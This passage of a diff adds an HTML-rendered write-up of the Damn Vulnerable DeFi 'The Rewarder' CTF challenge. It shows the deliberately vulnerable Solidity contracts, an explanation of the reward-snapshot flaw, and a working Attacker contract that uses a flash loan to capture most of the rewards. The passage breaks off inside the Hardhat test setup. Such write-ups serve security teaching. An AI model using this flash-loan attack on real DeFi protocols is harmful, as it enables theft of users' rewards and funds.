+        <span class="p">}</span>
+
+        <span class="n">liquidityToken</span><span class="o">.</span><span class="n">transfer</span><span class="p">(</span><span class="n">msg</span><span class="o">.</span><span class="n">sender</span><span class="p">,</span> <span class="n">amount</span><span class="p">);</span>
+
+        <span class="n">msg</span><span class="o">.</span><span class="n">sender</span><span class="o">.</span><span class="n">functionCall</span><span class="p">(</span><span class="n">abi</span><span class="o">.</span><span class="n">encodeWithSignature</span><span class="p">(</span><span class="s2">&quot;receiveFlashLoan(uint256)&quot;</span><span class="p">,</span> <span class="n">amount</span><span class="p">));</span>
+
+        <span class="k">if</span> <span class="p">(</span><span class="n">liquidityToken</span><span class="o">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="n">address</span><span class="p">(</span><span class="n">this</span><span class="p">))</span> <span class="o">&lt;</span> <span class="n">balanceBefore</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">revert</span> <span class="n">FlashLoanNotPaidBack</span><span class="p">();</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>RewardToken.sol</p>
+<div class="codehilite"><pre><span></span><code><span class="o">//</span> <span class="n">SPDX</span><span class="o">-</span><span class="n">License</span><span class="o">-</span><span class="n">Identifier</span><span class="p">:</span> <span class="n">MIT</span>
+
+<span class="n">pragma</span> <span class="n">solidity</span> <span class="o">^</span><span class="mf">0.8.0</span><span class="p">;</span>
+
+<span class="kn">import</span> <span class="s2">&quot;@openzeppelin/contracts/token/ERC20/ERC20.sol&quot;</span><span class="p">;</span>
+<span class="kn">import</span> <span class="s2">&quot;solady/src/auth/OwnableRoles.sol&quot;</span><span class="p">;</span>
+
+<span class="o">/**</span>
+ <span class="o">*</span> <span class="nd">@title</span> <span class="n">RewardToken</span>
+ <span class="o">*</span> <span class="nd">@author</span> <span class="n">Damn</span> <span class="n">Vulnerable</span> <span class="n">DeFi</span> <span class="p">(</span><span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">damnvulnerabledefi</span><span class="o">.</span><span class="n">xyz</span><span class="p">)</span>
+ <span class="o">*/</span>
+<span class="n">contract</span> <span class="n">RewardToken</span> <span class="ow">is</span> <span class="n">ERC20</span><span class="p">,</span> <span class="n">OwnableRoles</span> <span class="p">{</span>
+    <span class="n">uint256</span> <span class="n">public</span> <span class="n">constant</span> <span class="n">MINTER_ROLE</span> <span class="o">=</span> <span class="n">_ROLE_0</span><span class="p">;</span>
+
+    <span class="n">constructor</span><span class="p">()</span> <span class="n">ERC20</span><span class="p">(</span><span class="s2">&quot;Reward Token&quot;</span><span class="p">,</span> <span class="s2">&quot;RWT&quot;</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">_initializeOwner</span><span class="p">(</span><span class="n">msg</span><span class="o">.</span><span class="n">sender</span><span class="p">);</span>
+        <span class="n">_grantRoles</span><span class="p">(</span><span class="n">msg</span><span class="o">.</span><span class="n">sender</span><span class="p">,</span> <span class="n">MINTER_ROLE</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="n">function</span> <span class="n">mint</span><span class="p">(</span><span class="n">address</span> <span class="n">to</span><span class="p">,</span> <span class="n">uint256</span> <span class="n">amount</span><span class="p">)</span> <span class="n">external</span> <span class="n">onlyRoles</span><span class="p">(</span><span class="n">MINTER_ROLE</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">_mint</span><span class="p">(</span><span class="n">to</span><span class="p">,</span> <span class="n">amount</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>TheRewarderPool.sol</p>
+<div class="codehilite"><pre><span></span><code><span class="o">//</span> <span class="n">SPDX</span><span class="o">-</span><span class="n">License</span><span class="o">-</span><span class="n">Identifier</span><span class="p">:</span> <span class="n">MIT</span>
+<span class="n">pragma</span> <span class="n">solidity</span> <span class="o">^</span><span class="mf">0.8.0</span><span class="p">;</span>
+
+<span class="kn">import</span> <span class="s2">&quot;solady/src/utils/FixedPointMathLib.sol&quot;</span><span class="p">;</span>
+<span class="kn">import</span> <span class="s2">&quot;solady/src/utils/SafeTransferLib.sol&quot;</span><span class="p">;</span>
+<span class="kn">import</span> <span class="p">{</span> <span class="n">RewardToken</span> <span class="p">}</span> <span class="kn">from</span> <span class="s2">&quot;./RewardToken.sol&quot;</span><span class="p">;</span>
+<span class="kn">import</span> <span class="p">{</span> <span class="n">AccountingToken</span> <span class="p">}</span> <span class="kn">from</span> <span class="s2">&quot;./AccountingToken.sol&quot;</span><span class="p">;</span>
+
+<span class="o">/**</span>
+ <span class="o">*</span> <span class="nd">@title</span> <span class="n">TheRewarderPool</span>
+ <span class="o">*</span> <span class="nd">@author</span> <span class="n">Damn</span> <span class="n">Vulnerable</span> <span class="n">DeFi</span> <span class="p">(</span><span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">damnvulnerabledefi</span><span class="o">.</span><span class="n">xyz</span><span class="p">)</span>
+ <span class="o">*/</span>
+<span class="n">contract</span> <span class="n">TheRewarderPool</span> <span class="p">{</span>
+    <span class="n">using</span> <span class="n">FixedPointMathLib</span> <span class="k">for</span> <span class="n">uint256</span><span class="p">;</span>
+
+    <span class="o">//</span> <span class="n">Minimum</span> <span class="n">duration</span> <span class="n">of</span> <span class="n">each</span> <span class="nb">round</span> <span class="n">of</span> <span class="n">rewards</span> <span class="ow">in</span> <span class="n">seconds</span>
+    <span class="n">uint256</span> <span class="n">private</span> <span class="n">constant</span> <span class="n">REWARDS_ROUND_MIN_DURATION</span> <span class="o">=</span> <span class="mi">5</span> <span class="n">days</span><span class="p">;</span>
+
+    <span class="n">uint256</span> <span class="n">public</span> <span class="n">constant</span> <span class="n">REWARDS</span> <span class="o">=</span> <span class="mi">100</span> <span class="n">ether</span><span class="p">;</span>
+
+    <span class="o">//</span> <span class="n">Token</span> <span class="n">deposited</span> <span class="n">into</span> <span class="n">the</span> <span class="n">pool</span> <span class="n">by</span> <span class="n">users</span>
+    <span class="n">address</span> <span class="n">public</span> <span class="n">immutable</span> <span class="n">liquidityToken</span><span class="p">;</span>
+
+    <span class="o">//</span> <span class="n">Token</span> <span class="n">used</span> <span class="k">for</span> <span class="n">internal</span> <span class="n">accounting</span> <span class="ow">and</span> <span class="n">snapshots</span>
+    <span class="o">//</span> <span class="n">Pegged</span> <span class="mi">1</span><span class="p">:</span><span class="mi">1</span> <span class="k">with</span> <span class="n">the</span> <span class="n">liquidity</span> <span class="n">token</span>
+    <span class="n">AccountingToken</span> <span class="n">public</span> <span class="n">immutable</span> <span class="n">accountingToken</span><span class="p">;</span>
+
+    <span class="o">//</span> <span class="n">Token</span> <span class="ow">in</span> <span class="n">which</span> <span class="n">rewards</span> <span class="n">are</span> <span class="n">issued</span>
+    <span class="n">RewardToken</span> <span class="n">public</span> <span class="n">immutable</span> <span class="n">rewardToken</span><span class="p">;</span>
+
+    <span class="n">uint128</span> <span class="n">public</span> <span class="n">lastSnapshotIdForRewards</span><span class="p">;</span>
+    <span class="n">uint64</span> <span class="n">public</span> <span class="n">lastRecordedSnapshotTimestamp</span><span class="p">;</span>
+    <span class="n">uint64</span> <span class="n">public</span> <span class="n">roundNumber</span><span class="p">;</span> <span class="o">//</span> <span class="n">Track</span> <span class="n">number</span> <span class="n">of</span> <span class="n">rounds</span>
+    <span class="n">mapping</span><span class="p">(</span><span class="n">address</span> <span class="o">=&gt;</span> <span class="n">uint64</span><span class="p">)</span> <span class="n">public</span> <span class="n">lastRewardTimestamps</span><span class="p">;</span>
+
+    <span class="n">error</span> <span class="n">InvalidDepositAmount</span><span class="p">();</span>
+
+    <span class="n">constructor</span><span class="p">(</span><span class="n">address</span> <span class="n">_token</span><span class="p">)</span> <span class="p">{</span>
+        <span class="o">//</span> <span class="n">Assuming</span> <span class="nb">all</span> <span class="n">tokens</span> <span class="n">have</span> <span class="mi">18</span> <span class="n">decimals</span>
+        <span class="n">liquidityToken</span> <span class="o">=</span> <span class="n">_token</span><span class="p">;</span>
+        <span class="n">accountingToken</span> <span class="o">=</span> <span class="n">new</span> <span class="n">AccountingToken</span><span class="p">();</span>
+        <span class="n">rewardToken</span> <span class="o">=</span> <span class="n">new</span> <span class="n">RewardToken</span><span class="p">();</span>
+
+        <span class="n">_recordSnapshot</span><span class="p">();</span>
+    <span class="p">}</span>
+
+    <span class="o">/**</span>
+     <span class="o">*</span> <span class="nd">@notice</span> <span class="n">Deposit</span> <span class="err">`</span><span class="n">amount</span><span class="err">`</span> <span class="n">liquidity</span> <span class="n">tokens</span> <span class="n">into</span> <span class="n">the</span> <span class="n">pool</span><span class="p">,</span> <span class="n">minting</span> <span class="n">accounting</span> <span class="n">tokens</span> <span class="ow">in</span> <span class="n">exchange</span><span class="o">.</span>
+     <span class="o">*</span>         <span class="n">Also</span> <span class="n">distributes</span> <span class="n">rewards</span> <span class="k">if</span> <span class="n">available</span><span class="o">.</span>
+     <span class="o">*</span> <span class="nd">@param</span> <span class="n">amount</span> <span class="n">amount</span> <span class="n">of</span> <span class="n">tokens</span> <span class="n">to</span> <span class="n">be</span> <span class="n">deposited</span>
+     <span class="o">*/</span>
+    <span class="n">function</span> <span class="n">deposit</span><span class="p">(</span><span class="n">uint256</span> <span class="n">amount</span><span class="p">)</span> <span class="n">external</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">amount</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">revert</span> <span class="n">InvalidDepositAmount</span><span class="p">();</span>
+        <span class="p">}</span>
+
+        <span class="n">accountingToken</span><span class="o">.</span><span class="n">mint</span><span class="p">(</span><span class="n">msg</span><span class="o">.</span><span class="n">sender</span><span class="p">,</span> <span class="n">amount</span><span class="p">);</span>
+        <span class="n">distributeRewards</span><span class="p">();</span>
+
+        <span class="n">SafeTransferLib</span><span class="o">.</span><span class="n">safeTransferFrom</span><span class="p">(</span>
+            <span class="n">liquidityToken</span><span class="p">,</span>
+            <span class="n">msg</span><span class="o">.</span><span class="n">sender</span><span class="p">,</span>
+            <span class="n">address</span><span class="p">(</span><span class="n">this</span><span class="p">),</span>
+            <span class="n">amount</span>
+        <span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="n">function</span> <span class="n">withdraw</span><span class="p">(</span><span class="n">uint256</span> <span class="n">amount</span><span class="p">)</span> <span class="n">external</span> <span class="p">{</span>
+        <span class="n">accountingToken</span><span class="o">.</span><span class="n">burn</span><span class="p">(</span><span class="n">msg</span><span class="o">.</span><span class="n">sender</span><span class="p">,</span> <span class="n">amount</span><span class="p">);</span>
+        <span class="n">SafeTransferLib</span><span class="o">.</span><span class="n">safeTransfer</span><span class="p">(</span><span class="n">liquidityToken</span><span class="p">,</span> <span class="n">msg</span><span class="o">.</span><span class="n">sender</span><span class="p">,</span> <span class="n">amount</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="n">function</span> <span class="n">distributeRewards</span><span class="p">()</span> <span class="n">public</span> <span class="n">returns</span> <span class="p">(</span><span class="n">uint256</span> <span class="n">rewards</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">isNewRewardsRound</span><span class="p">())</span> <span class="p">{</span>
+            <span class="n">_recordSnapshot</span><span class="p">();</span>
+        <span class="p">}</span>
+
+        <span class="n">uint256</span> <span class="n">totalDeposits</span> <span class="o">=</span> <span class="n">accountingToken</span><span class="o">.</span><span class="n">totalSupplyAt</span><span class="p">(</span><span class="n">lastSnapshotIdForRewards</span><span class="p">);</span>
+        <span class="n">uint256</span> <span class="n">amountDeposited</span> <span class="o">=</span> <span class="n">accountingToken</span><span class="o">.</span><span class="n">balanceOfAt</span><span class="p">(</span><span class="n">msg</span><span class="o">.</span><span class="n">sender</span><span class="p">,</span> <span class="n">lastSnapshotIdForRewards</span><span class="p">);</span>
+
+        <span class="k">if</span> <span class="p">(</span><span class="n">amountDeposited</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">totalDeposits</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">rewards</span> <span class="o">=</span> <span class="n">amountDeposited</span><span class="o">.</span><span class="n">mulDiv</span><span class="p">(</span><span class="n">REWARDS</span><span class="p">,</span> <span class="n">totalDeposits</span><span class="p">);</span>
+            <span class="k">if</span> <span class="p">(</span><span class="n">rewards</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="err">!</span><span class="n">_hasRetrievedReward</span><span class="p">(</span><span class="n">msg</span><span class="o">.</span><span class="n">sender</span><span class="p">))</span> <span class="p">{</span>
+                <span class="n">rewardToken</span><span class="o">.</span><span class="n">mint</span><span class="p">(</span><span class="n">msg</span><span class="o">.</span><span class="n">sender</span><span class="p">,</span> <span class="n">rewards</span><span class="p">);</span>
+                <span class="n">lastRewardTimestamps</span><span class="p">[</span><span class="n">msg</span><span class="o">.</span><span class="n">sender</span><span class="p">]</span> <span class="o">=</span> <span class="n">uint64</span><span class="p">(</span><span class="n">block</span><span class="o">.</span><span class="n">timestamp</span><span class="p">);</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+
+    <span class="n">function</span> <span class="n">_recordSnapshot</span><span class="p">()</span> <span class="n">private</span> <span class="p">{</span>
+        <span class="n">lastSnapshotIdForRewards</span> <span class="o">=</span> <span class="n">uint128</span><span class="p">(</span><span class="n">accountingToken</span><span class="o">.</span><span class="n">snapshot</span><span class="p">());</span>
+        <span class="n">lastRecordedSnapshotTimestamp</span> <span class="o">=</span> <span class="n">uint64</span><span class="p">(</span><span class="n">block</span><span class="o">.</span><span class="n">timestamp</span><span class="p">);</span>
+        <span class="n">unchecked</span> <span class="p">{</span>
+            <span class="o">++</span><span class="n">roundNumber</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+
+    <span class="n">function</span> <span class="n">_hasRetrievedReward</span><span class="p">(</span><span class="n">address</span> <span class="n">account</span><span class="p">)</span> <span class="n">private</span> <span class="n">view</span> <span class="n">returns</span> <span class="p">(</span><span class="nb">bool</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="p">(</span>
+            <span class="n">lastRewardTimestamps</span><span class="p">[</span><span class="n">account</span><span class="p">]</span> <span class="o">&gt;=</span> <span class="n">lastRecordedSnapshotTimestamp</span>
+                <span class="o">&amp;&amp;</span> <span class="n">lastRewardTimestamps</span><span class="p">[</span><span class="n">account</span><span class="p">]</span> <span class="o">&lt;=</span> <span class="n">lastRecordedSnapshotTimestamp</span> <span class="o">+</span> <span class="n">REWARDS_ROUND_MIN_DURATION</span>
+        <span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="n">function</span> <span class="n">isNewRewardsRound</span><span class="p">()</span> <span class="n">public</span> <span class="n">view</span> <span class="n">returns</span> <span class="p">(</span><span class="nb">bool</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="n">block</span><span class="o">.</span><span class="n">timestamp</span> <span class="o">&gt;=</span> <span class="n">lastRecordedSnapshotTimestamp</span> <span class="o">+</span> <span class="n">REWARDS_ROUND_MIN_DURATION</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<h2 id="goal">Goal</h2>
+<p>Claim most of the rewards (RWT token) for ourselves.</p>
+<h2 id="exploit">Exploit</h2>
+<p>In order to finish this CTF we will have to use another smart contract. We can name this contract Attacker.</p>
+<p>The vulnerable part of the code is located in the TheRewarderPool contract</p>
+<div class="codehilite"><pre><span></span><code>rewards = amountDeposited.mulDiv(REWARDS, totalDeposits);
+</code></pre></div>
+
+<p>the part were the rewards are calculated. To be able to spread the rewards equally we need to store the number of accounts that should receive awards, but this is not taken into account.</p>
+<p>To exploit the reward pool we need to:</p>
+<ol>
+<li>create Attacker contract, this contract will be borrowing the flash loan from the FlashLoanerPool, and need to have instances of of the FlashLoanerPool, TheRewarderPool and the DamnValuableToken contracts</li>
+<li>
+<p>create receiveFlashLoan(uint amount) external function, this will be the callback function that will be called when receiving the flash loan from FlashLoanerPool, inside this function we will:
+<br />
+<ul>
+  <li>approve the TheRewarderPool to use the flash loan</li>
+  <li>deposit the borrowed DVT tokens to the TheRewarderPool in order to be able to receive rewards</li>
+  <li>withdraw the deposited DVT tokens from the TheRewarderPool</li>
+  <li>return the loan to the FlashLoanerPool, transfer the DVT tokens to the flash loaner pool contract</li>
+  </ul></p>
+</li>
+<li>
+<p>create attack(uint amount, address rewardToken) external function, inside this function we will execute the flash loan (call flashLoan function from the FlashLoanerPool contract), and after that transfer the reward tokens (RWT) to our EOA</p>
+</li>
+<li>wait for a new round to come, await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days</li>
+<li>create instance of the Attacker contract</li>
+<li>call the attack function on the Attacker contract</li>
+</ol>
+<h2 id="attacker-contract-code">Attacker contract code</h2>
+<div class="codehilite"><pre><span></span><code><span class="o">//</span> <span class="n">SPDX</span><span class="o">-</span><span class="n">License</span><span class="o">-</span><span class="n">Identifier</span><span class="p">:</span> <span class="n">MIT</span>
+
+<span class="n">pragma</span> <span class="n">solidity</span> <span class="o">^</span><span class="mf">0.8.0</span><span class="p">;</span>
+
+<span class="kn">import</span> <span class="s2">&quot;@openzeppelin/contracts/token/ERC20/IERC20.sol&quot;</span><span class="p">;</span>
+<span class="kn">import</span> <span class="s2">&quot;./FlashLoanerPool.sol&quot;</span><span class="p">;</span>
+<span class="kn">import</span> <span class="s2">&quot;./TheRewarderPool.sol&quot;</span><span class="p">;</span>
+<span class="kn">import</span> <span class="s2">&quot;../DamnValuableToken.sol&quot;</span><span class="p">;</span>
+
+<span class="n">contract</span> <span class="n">Attacker</span> <span class="p">{</span>
+    <span class="n">FlashLoanerPool</span> <span class="n">private</span> <span class="n">immutable</span> <span class="n">pool</span><span class="p">;</span>
+    <span class="n">TheRewarderPool</span> <span class="n">private</span> <span class="n">immutable</span> <span class="n">rewarder</span><span class="p">;</span>
+    <span class="n">DamnValuableToken</span> <span class="n">private</span> <span class="n">immutable</span> <span class="n">liquidityToken</span><span class="p">;</span>
+
+    <span class="n">constructor</span><span class="p">(</span><span class="n">FlashLoanerPool</span> <span class="n">_pool</span><span class="p">,</span> <span class="n">TheRewarderPool</span> <span class="n">_rewarder</span><span class="p">,</span> <span class="n">DamnValuableToken</span> <span class="n">_liquidityToken</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">pool</span> <span class="o">=</span> <span class="n">FlashLoanerPool</span><span class="p">(</span><span class="n">_pool</span><span class="p">);</span>
+        <span class="n">rewarder</span> <span class="o">=</span> <span class="n">TheRewarderPool</span><span class="p">(</span><span class="n">_rewarder</span><span class="p">);</span>
+        <span class="n">liquidityToken</span> <span class="o">=</span> <span class="n">DamnValuableToken</span><span class="p">(</span><span class="n">_liquidityToken</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="n">function</span> <span class="n">receiveFlashLoan</span><span class="p">(</span><span class="n">uint256</span> <span class="n">amount</span><span class="p">)</span> <span class="n">external</span> <span class="p">{</span>
+        <span class="n">liquidityToken</span><span class="o">.</span><span class="n">approve</span><span class="p">(</span><span class="n">address</span><span class="p">(</span><span class="n">rewarder</span><span class="p">),</span> <span class="n">amount</span><span class="p">);</span>
+        <span class="n">rewarder</span><span class="o">.</span><span class="n">deposit</span><span class="p">(</span><span class="n">amount</span><span class="p">);</span>
+        <span class="n">rewarder</span><span class="o">.</span><span class="n">withdraw</span><span class="p">(</span><span class="n">amount</span><span class="p">);</span>
+        <span class="n">liquidityToken</span><span class="o">.</span><span class="n">transfer</span><span class="p">(</span><span class="n">address</span><span class="p">(</span><span class="n">pool</span><span class="p">),</span> <span class="n">amount</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="n">function</span> <span class="n">attack</span><span class="p">(</span><span class="n">uint256</span> <span class="n">amount</span><span class="p">,</span> <span class="n">address</span> <span class="n">rewardToken</span><span class="p">)</span> <span class="n">external</span> <span class="p">{</span>
+        <span class="n">pool</span><span class="o">.</span><span class="n">flashLoan</span><span class="p">(</span><span class="n">amount</span><span class="p">);</span>
+        <span class="n">IERC20</span><span class="p">(</span><span class="n">rewardToken</span><span class="p">)</span><span class="o">.</span><span class="n">transfer</span><span class="p">(</span><span class="n">msg</span><span class="o">.</span><span class="n">sender</span><span class="p">,</span> <span class="n">IERC20</span><span class="p">(</span><span class="n">rewardToken</span><span class="p">)</span><span class="o">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="n">address</span><span class="p">(</span><span class="n">this</span><span class="p">)));</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<h2 id="solution-code">Solution code</h2>
+<div class="codehilite"><pre><span></span><code><span class="n">const</span><span class="w"> </span><span class="err">{</span><span class="w"> </span><span class="n">ethers</span><span class="w"> </span><span class="err">}</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">require</span><span class="p">(</span><span class="s1">&#39;hardhat&#39;</span><span class="p">);</span>
+<span class="n">const</span><span class="w"> </span><span class="err">{</span><span class="w"> </span><span class="n">expect</span><span class="w"> </span><span class="err">}</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">require</span><span class="p">(</span><span class="s1">&#39;chai&#39;</span><span class="p">);</span>
+
+<span class="k">describe</span><span class="p">(</span><span class="s1">&#39;[Challenge] The rewarder&#39;</span><span class="p">,</span><span class="w"> </span><span class="k">function</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="err">{</span>
+<span class="w">    </span><span class="n">const</span><span class="w"> </span><span class="n">TOKENS_IN_LENDER_POOL</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1000000</span><span class="n">n</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mi">10</span><span class="n">n</span><span class="w"> </span><span class="o">**</span><span class="w"> </span><span class="mi">18</span><span class="n">n</span><span class="p">;</span><span class="w"> </span><span class="o">//</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">million</span><span class="w"> </span><span class="n">tokens</span>
+<span class="w">    </span><span class="n">let</span><span class="w"> </span><span class="n">users</span><span class="p">,</span><span class="w"> </span><span class="n">deployer</span><span class="p">,</span><span class="w"> </span><span class="n">alice</span><span class="p">,</span><span class="w"> </span><span class="n">bob</span><span class="p">,</span><span class="w"> </span><span class="n">charlie</span><span class="p">,</span><span class="w"> </span><span class="n">david</span><span class="p">,</span><span class="w"> </span><span class="n">player</span><span class="p">;</span>
+<span class="w">    </span><span class="n">let</span><span class="w"> </span><span class="n">liquidityToken</span><span class="p">,</span><span class="w"> </span><span class="n">flashLoanPool</span><span class="p">,</span><span class="w"> </span><span class="n">rewarderPool</span><span class="p">,</span><span class="w"> </span><span class="n">rewardToken</span><span class="p">,</span><span class="w"> </span><span class="n">accountingToken</span><span class="p">;</span>
+
+<span class="w">    </span><span class="k">before</span><span class="p">(</span><span class="n">async</span><span class="w"> </span><span class="k">function</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="err">{</span>
+<span class="w">        </span><span class="cm">/** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */</span>
+
+<span class="w">        </span><span class="o">[</span><span class="n">deployer, alice, bob, charlie, david, player</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">await</span><span class="w"> </span><span class="n">ethers</span><span class="p">.</span><span class="n">getSigners</span><span class="p">();</span>
+<span class="w">        </span><span class="n">users</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">[</span><span class="n">alice, bob, charlie, david</span><span class="o">]</span><span class="p">;</span>
+
+<span class="w">        </span><span class="n">const</span><span class="w"> </span><span class="n">FlashLoanerPoolFactory</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">await</span><span class="w"> </span><span class="n">ethers</span><span class="p">.</span><span class="n">getContractFactory</span><span class="p">(</span><span class="s1">&#39;FlashLoanerPool&#39;</span><span class="p">,</span><span class="w"> </span><span class="n">deployer</span><span class="p">);</span>
+<span class="w">        </span><span class="n">const</span><span class="w"> </span><span class="n">TheRewarderPoolFactory</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">await</span><span class="w"> </span><span class="n">ethers</span><span class="p">.</span><span class="n">getContractFactory</span><span class="p">(</span><span class="s1">&#39;TheRewarderPool&#39;</span><span class="p">,</span><span class="w"> </span><span class="n">deployer</span><span class="p">);</span>
+<span class="w">        </span><span class="n">const</span><span class="w"> </span><span class="n">DamnValuableTokenFactory</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">await</span><span class="w"> </span><span class="n">ethers</span><span class="p">.</span><span class="n">getContractFactory</span><span class="p">(</span><span class="s1">&#39;DamnValuableToken&#39;</span><span class="p">,</span><span class="w"> </span><span class="n">deployer</span><span class="p">);</span>
+<span class="w">        </span><span class="n">const</span><span class="w"> </span><span class="n">RewardTokenFactory</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">await</span><span class="w"> </span><span class="n">ethers</span><span class="p">.</span><span class="n">getContractFactory</span><span class="p">(</span><span class="s1">&#39;RewardToken&#39;</span><span class="p">,</span><span class="w"> </span><span class="n">deployer</span><span class="p">);</span>
+<span class="w">        </span><span class="n">const</span><span class="w"> </span><span class="n">AccountingTokenFactory</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">await</span><span class="w"> </span><span class="n">ethers</span><span class="p">.</span><span class="n">getContractFactory</span><span class="p">(</span><span class="s1">&#39;AccountingToken&#39;</span><span class="p">,</span><span class="w"> </span><span class="n">deployer</span><span class="p">);</span>
+
+<span class="w">        </span><span class="n">liquidityToken</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">await</span><span class="w"> </span><span class="n">DamnValuableTokenFactory</span><span class="p">.</span><span class="n">deploy</span><span class="p">();</span>
+<span class="w">        </span><span class="n">flashLoanPool</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">await</span><span class="w"> </span><span class="n">FlashLoanerPoolFactory</span><span class="p">.</span><span class="n">deploy</span><span class="p">(</span><span class="n">liquidityToken</span><span class="p">.</span><span class="n">address</span><span class="p">);</span>
+
+<span class="w">        </span><span class="o">//</span><span class="w"> </span><span class="k">Set</span><span class="w"> </span><span class="n">initial</span><span class="w"> </span><span class="n">token</span><span class="w"> </span><span class="n">balance</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">pool</span><span class="w"> </span><span class="n">offering</span><span class="w"> </span><span class="n">flash</span><span class="w"> </span><span class="n">loans</span>
+<span class="w">        </span><span class="n">await</span><span class="w"> </span><span class="n">liquidityToken</span><span class="p">.</span><span class="n">transfer</span><span class="p">(</span><span class="n">flashLoanPool</span><span class="p">.</span><span class="n">address</span><span class="p">,</span><span class="w"> </span><span class="n">TOKENS_IN_LENDER_POOL</span><span class="p">);</span>
+
+<span class="w">        </span><span class="n">rewarderPool</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">await</span><span class="w"> </span><span class="n">TheRewarderPoolFactory</span><span class="p">.</span><span class="n">deploy</span><span class="p">(</span><span class="n">liquidityToken</span><span class="p">.</span><span class="n">address</span><span class="p">);</span>
+<span class="w">        </span><span class="n">rewardToken</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">RewardTokenFactory</span><span class="p">.</span><span class="n">attach</span><span class="p">(</span><span class="n">await</span><span class="w"> </span><span class="n">rewarderPool</span><span class="p">.</span><span class="n">rewardToken</span><span class="p">());</span>
+<span class="w">        </span><span class="n">accountingToken</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">AccountingTokenFactory</span><span class="p">.</span><span class="n">attach</span><span class="p">(</span><span class="n">await</span><span class="w"> </span><span class="n">rewarderPool</span><span class="p">.</span><span class="n">accountingToken</span><span class="p">());</span>
+
+<span class="w">        </span><span class="o">//</span><span class="w"> </span><span class="k">Check</span><span class="w"> </span><span class="n">roles</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">accounting</span><span class="w"> </span><span class="n">token</span>
+<span class="w">        </span><span class="n">expect</span><span class="p">(</span><span class="n">await</span><span class="w"> </span><span class="n">accountingToken</span><span class="p">.</span><span class="n">owner</span><span class="p">()).</span><span class="k">to</span><span class="p">.</span><span class="n">eq</span><span class="p">(</span><span class="n">rewarderPool</span><span class="p">.</span><span class="n">address</span><span class="p">);</span>
+<span class="w">        </span><span class="n">const</span><span class="w"> </span><span class="n">minterRole</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">await</span><span class="w"> </span><span class="n">accountingToken</span><span class="p">.</span><span class="n">MINTER_ROLE</span><span class="p">();</span>
+<span class="w">        </span><span class="n">const</span><span class="w"> </span><span class="n">snapshotRole</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">await</span><span class="w"> </span><span class="n">accountingToken</span><span class="p">.</span><span class="n">SNAPSHOT_ROLE</span><span class="p">();</span>
+<span class="w">        </span><span class="n">const</span><span class="w"> </span><span class="n">burnerRole</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">await</span><span class="w"> </span><span class="n">accountingToken</span><span class="p">.</span><span class="n">BURNER_ROLE</span><span class="p">();</span>
